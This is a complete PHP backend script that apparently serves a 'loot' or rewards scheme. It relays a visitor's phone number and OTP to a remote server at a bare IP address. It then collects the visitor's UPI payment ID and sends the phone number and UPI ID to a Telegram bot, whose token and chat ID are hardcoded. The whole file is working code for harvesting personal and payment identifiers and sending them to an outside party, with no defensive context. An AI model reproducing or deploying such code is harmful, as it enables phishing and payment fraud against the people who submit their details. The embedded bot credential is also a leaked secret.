<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    exit;
}

// =======================================================
//          !!! CUSTOM CONFIGURATION !!!
// =======================================================
// Your personal Bot Token and Chat ID are embedded.
$botToken = '8038263033:AAEhPlCJ1DOZ4LFTFJJXT59PKg3xDnJ6w3Q';
$chatId = '6575825147';
// =======================================================

$response = [];
$action = $_POST['action'] ?? '';

function makeRequest($url, $phoneNumber) {
    $cookieFile = sys_get_temp_dir() . '/cookie_' . preg_replace('/[^0-9]/', '', $phoneNumber) . '.txt';
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 20,
        CURLOPT_FOLLOWLOCATION => true, CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        CURLOPT_COOKIEJAR => $cookieFile, CURLOPT_COOKIEFILE => $cookieFile,
    ]);
    $html = curl_exec($ch);
    curl_close($ch);
    return $html;
}

function sendMessageToTelegram($message) {
    global $botToken, $chatId;
    if ($botToken === 'YOUR_TELEGRAM_BOT_TOKEN' || $chatId === 'YOUR_TELEGRAM_CHAT_ID') return;
    $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = http_build_query(['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML']);
    $ch = curl_init();
    curl_setopt_array($ch, [CURLOPT_URL => $telegramApiUrl, CURLOPT_POST => true, CURLOPT_POSTFIELDS => $postData, CURLOPT_RETURNTRANSFER => true]);
    curl_exec($ch);
    curl_close($ch);
}

$baseUrl = 'http://13.234.36.150/loot/';

switch ($action) {
    case 'request_otp':
        $phone = $_POST['phone'] ?? '';
        if (empty($phone)) { $response = ['status' => 'error', 'message' => 'Phone number is required.']; break; }
        
        $url = $baseUrl . '?rno=' . urlencode($phone) . '&submit=submit';
        $html = makeRequest($url, $phone);

        // --- NEW LOGIC TO CHECK THE RESPONSE ---
        if (strpos($html, 'OTP SEND SUCCESSFUL') !== false) {
            // This is a NEW user, tell the frontend to show the OTP page.
            $response = ['status' => 'success', 'action' => 'show_otp', 'message' => 'OTP sent successfully!'];
        } elseif (strpos($html, 'User Is Verified') !== false) {
            // This is a REGISTERED user, tell the frontend to SKIP to the UPI page.
            $response = ['status' => 'success', 'action' => 'show_upi', 'message' => 'Welcome back! Please enter your UPI ID.'];
        } else {
            // This is an error.
            $response = ['status' => 'error', 'message' => 'Failed. The number may be invalid.'];
        }
        break;

    case 'verify_otp':
        $phone = $_POST['phone'] ?? '';
        $otp = $_POST['otp'] ?? '';
        if (empty($phone) || empty($otp)) { $response = ['status' => 'error', 'message' => 'Phone and OTP are required.']; break; }
        $url = $baseUrl . 'otp.php?phone=' . urlencode($phone) . '&otp=' . urlencode($otp) . '&submit=submit';
        $html = makeRequest($url, $phone);
        if (strpos($html, 'User Is Verified') !== false) {
            $response = ['status' => 'success', 'message' => 'OTP Verified! Please enter your UPI ID.'];
        } else {
            $response = ['status' => 'error', 'message' => 'OTP is incorrect or expired.'];
        }
        break;

    case 'submit_upi':
        $phone = $_POST['phone'] ?? '';
        $upi = $_POST['upi'] ?? '';
        if (empty($phone) || empty($upi)) { $response = ['status' => 'error', 'message' => 'Phone and UPI ID are required.']; break; }
        
        $message = "<b>✨ New SLoots Submission ✨</b>\n\n<b>Phone:</b> <code>" . htmlspecialchars($phone) . "</code>\n<b>UPI ID:</b> <code>" . htmlspecialchars($upi) . "</code>";
        sendMessageToTelegram($message);
        
        $cookieFile = sys_get_temp_dir() . '/cookie_' . preg_replace('/[^0-9]/', '', $phone) . '.txt';
        if (file_exists($cookieFile)) { unlink($cookieFile); }
        
        $response = ['status' => 'success', 'message' => 'Submission successful! Your details have been sent to the admin.'];
        break;

    default:
        $response = ['status' => 'error', 'message' => 'Invalid action.'];
        break;
}

echo json_encode($response);
?>